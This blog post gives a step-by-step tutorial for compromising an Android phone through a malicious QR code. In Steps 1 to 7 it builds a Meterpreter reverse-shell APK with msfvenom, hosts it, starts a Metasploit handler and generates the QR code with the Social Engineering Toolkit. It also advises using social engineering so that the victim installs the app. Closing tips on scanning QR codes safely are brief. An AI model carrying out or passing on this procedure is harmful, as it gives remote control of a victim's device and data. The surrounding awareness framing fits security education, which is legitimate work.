[![Andrea Rebora](https://miro.medium.com/fit/c/28/28/1*Sc5Du4sVyZkiv-1L4u8Mmw.jpeg)](https://medium.com/@andrearebora?source=post_page-----fc71428630e--------------------------------)


![](https://miro.medium.com/max/800/1*_La8XfVMVDi0igqWCki2aQ.png)

Getty Images / Bill Hinton

I want to begin this article with a disclaimer: the method I am going to illustrate is one of several. It is not completely automatic, meaning the target will have a role to play. Consequently, social engineering is a critical component. As a NortonLifeLock employee [explained](https://us.norton.com/internetsecurity-emerging-threats-what-is-social-engineering.html), social engineering is the act of deceiving someone into acting or divulging information, taking advantage of a victim’s natural tendencies and emotional reactions. In addition, the method might not work on every Android device. Security settings, presence of anti-viruses, and Google safety mechanisms are just a few of the possible obstacles to a successful attack.

**What is a QR code?**

The Quick Response code, or QR code, was invented in 1994 by Denso Wave, a Japanese company that produces automatic identification products, industrial robots, and programmable logic controllers. The code is a machine-readable data format; it was invented to track vehicles during manufacturing and designed to allow high-speed component scanning. A QR code consists of several black squares and dots which represent specific pieces of information. When a device scans the code, it translates the data into human-readable information.

Today, QR codes are used in a variety of industries and for multiple applications such as tracking purposes and [mobile tagging](https://www.techopedia.com/definition/23587/mobile-tagging), which is the practice of creating visual elements that can be recognized by smartphones and related devices. These codes can be used to write a message, open a Uniform Resource Identifier (URI), display information to the user, and so on. In China, for instance, [QR codes are quite popular](https://www.wired.com/story/the-curious-comeback-of-the-dreaded-qr-code/): WeChat users can point their camera at the dotted square to exchange contact information, interact with brands and celebrities, buy clothes and food, access the web, and so on.

The symbol versions of QR code range from Version 1 to Version 40. Each version has a specific number of modules or module configuration. A module is the black and white dots that create the code. A [configuration](https://www.qrcode.com/en/about/version.html) is the number of modules contained in a symbol, with Version 1 having 21 × 21 modules up to Version 40 with 177 × 177 modules. The versions increase by four additional modules per side. Standard QR codes can hold up to 3Kb of data.

**Scenario**

In this scenario, the threat actor wants to obtain access to his target’s smartphone. After careful information gathering, he discovers that the target is using an Android device. Among the several methods available, he decides to conduct his attack via QR code. The threat actor will use [Kali Linux](https://www.kali.org/about-us/) as his operating system (OS) and he will leverage the capabilities of [Metasploit](https://www.metasploit.com/) and of the [Social Engineering Toolkit (SET)](https://www.trustedsec.com/tools/the-social-engineer-toolkit-set/).

**Step 1**

The first step is to use msfvenom to prepare the payload, the code that will allow the threat actor to obtain access to the target’s device.

Open the terminal and type the following: “msfvenom -p android/meterpreter/reverse\_tcp lhost=youripaddress lport=4444 r >/var/www/html/test.apk”

![](https://miro.medium.com/max/30/1*sy0X7FvilL6bEgFwquEXGw.png?q=20)

Lhost (local host) indicates the IP that the payload will use to connect back to the threat actor’s machine. If, for instance, the machine and the smartphone are connected to the same Wi-Fi, the IP can be found by typing in the terminal “ifconfig” and checking the “inet” (internet address) of the Wi-Fi card. If the smartphone is using mobile data or is connected to another router, the threat actor must use the public IP of his machine. It can be found by visiting whatismyipaddress.com.

**Step 2**

In the terminal, type “service apache2 start” and press \[Enter\]. Now, it is time to launch Metasploit. To properly run this tool, there are a few steps that should be followed. First, type “service postgresql start” and press \[Enter\]. Next, run the command “msfdb init”. Finally, run “msfconsole” to launch the tool.

![](https://miro.medium.com/max/30/1*KyUxjiWxn0YrhbmOVXrF5A.png?q=20)

**Step 3**

Type “use exploit/multi/handler” and press \[Enter\]. Then, type “set payload android/meterpreter/reverse\_tcp” and press \[Enter\]. Now, type “show options” to see the information needed to execute the attack.

![](https://miro.medium.com/max/27/1*F1JfjtimWbcp_v7MslTcMg.png?q=20)

As you can see from the screenshot, LHOST must be provided. LHOST, as mentioned, is the IP address used by the threat actor. To provide the information, type “set lhost” followed by your IP address. The format is “set \[space\] lhost \[space\] youripaddress”. As a final input, type “exploit” and press \[Enter\]. Remember, do not close the terminal.

**Step 4**

Open another terminal, type “setoolkit”, and press \[Enter\].

![](https://miro.medium.com/max/30/1*X5EZhfpyN5noccUJnoJ0FA.png?q=20)

Type “1” (to select “Social-Engineering Attacks”) and press \[Enter\].

![](https://miro.medium.com/max/26/1*KzMU_4x2PbdlBW_-Gkz9Mg.png?q=20)

Next, type “8” (to select “QRCode Generator Attack Vector”) and press \[Enter\]. When requested, type the IP address you used before followed by “/” and the payload, in this case “test.apk”. The format is the following: “youripaddress/nameofthepayload.apk”.

![](https://miro.medium.com/max/30/1*SErFiiNOUQx6wFpxhicxDw.png?q=20)

**Step 5**

Exit SEToolkit and type “cd /root/.set/reports” to find the folder where the QR code has been saved. At this point, the threat actor must use social engineering to convince the target to scan the code.

**Step 6**

The target scans the QR code. He receives a request to download the application.

![](https://miro.medium.com/max/19/1*hSQ0UTFjQN9behFiVs8qPw.png?q=20)

He is convinced that he is downloading an application he needs. Therefore, he follows the steps and successfully installs the app.

![](https://miro.medium.com/max/19/1*ZIGutt5kS_GfDcER2sIjFA.png?q=20)

**Step 7**

The moment the app is installed on the target’s device, the threat actor notices that a meterpreter session is now open. Typing “sysinfo” allows him to check if the operation has been successful. After confirming the positive results, he types “help” to visualize the many commands that can be executed.

![](https://miro.medium.com/max/28/1*d8uFuQqIQcA_XhXj9Xf7kA.png?q=20)

![](https://miro.medium.com/max/30/1*dmheGtss_-FAgQdL-NQuBA.png?q=20)

![](https://miro.medium.com/max/30/1*oNUZKXKunsRdBaqHMX7u7A.png?q=20)

**Known obstacles**

There are a few obstacles that must be addressed. Social engineering is halfway between a skill and an art. It is not easy, but depending on the situation, anyone can be tricked. Tiredness, hurriedness, boredom, anger, there are several emotions and states of mind that can be exploited. However, there are also technical challenges that might compromise the outcome of the attack.

First, not all QR scanners search the link directly. I used four scanners, and two of them searched the link on Google instead of searching it directly. Second, security mechanisms might hinder the process. If the target does not allow the installation of apps from unknown sources, the file will not be downloaded. Moreover, during the installation, Play Protect warned me twice regarding my actions. It happens that users just keep tapping without reading to make the notifications go away, but a more rational user might think again about downloading the file. In addition, before installing the app, a list of permissions is displayed, and the user might ask himself why the app needs access to virtually everything.

![](https://miro.medium.com/max/18/1*HZD6USilbLaU_y_a2e5sBA.png?q=20)

![](https://miro.medium.com/max/18/1*bEQmAKuiumET17HHUZ9I7g.png?q=20)

Third, the name. As you can see from the screenshots, “MainActivity” is very likely to alert most users. Moreover, the app is visibly different from a ‘classic’ one.

![](https://miro.medium.com/max/17/1*nYZEmI_ax7DCcDaDccchxA.png?q=20)

**Conclusion**

While there are methods to avoid the obstacles I listed, it is likely that a user would not download, or install, the application if multiple alerts warn him of suspicious activity. A situation where the threat actor has access, even briefly, to the target’s smartphone might provide the perfect opportunity to download the malicious file. It takes a few seconds and, when the app is installed, the threat actor could hide it in an unusual directory, possibly hidden. The moment the meterpreter session is open, the threat actor can further exploit the device, including sending the same QR code to other users via the target’s device.

QR codes, as demonstrated, can be used as a vector to compromise your device. The method I explained requires the target to manually download the malicious file, but many other exploits are automatic and stealthy and do not require further actions after scanning the code. Be careful about what you scan. Even a seemingly innocent QR code could lead to a harmful outcome. When you scan a code, think carefully about the following:

1\. Necessity. Do I really need to scan this code? Or am I just curious?

2\. The need to use a QR code. Are there other download methods? Is the source of the QR code a reputable one?

3\. The permissions. How many permissions is the app asking me? Is it rational for such an app to ask access to these sources?

4\. Security alerts. If you see an alert, stop and read. Remember, haste makes waste.

I hope this article provided you with a bit of entertainment and useful suggestions.